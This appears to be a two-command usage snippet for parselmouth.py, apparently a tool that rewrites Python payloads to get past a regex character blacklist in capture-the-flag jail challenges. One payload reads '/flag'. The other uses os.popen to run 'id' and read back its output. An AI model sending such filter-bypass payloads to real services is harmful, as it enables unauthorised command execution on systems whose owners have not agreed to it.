python3 parselmouth.py --payload "'/flag'" --re-rule '[A-Zd-z\\. /*$#@]'

# 或者

python3 parselmouth.py --payload "__import__('os').popen('id > txt 2>&1 |echo txt').read().strip()" --re-rule '[A-Zd-z\\. /*$#@]'
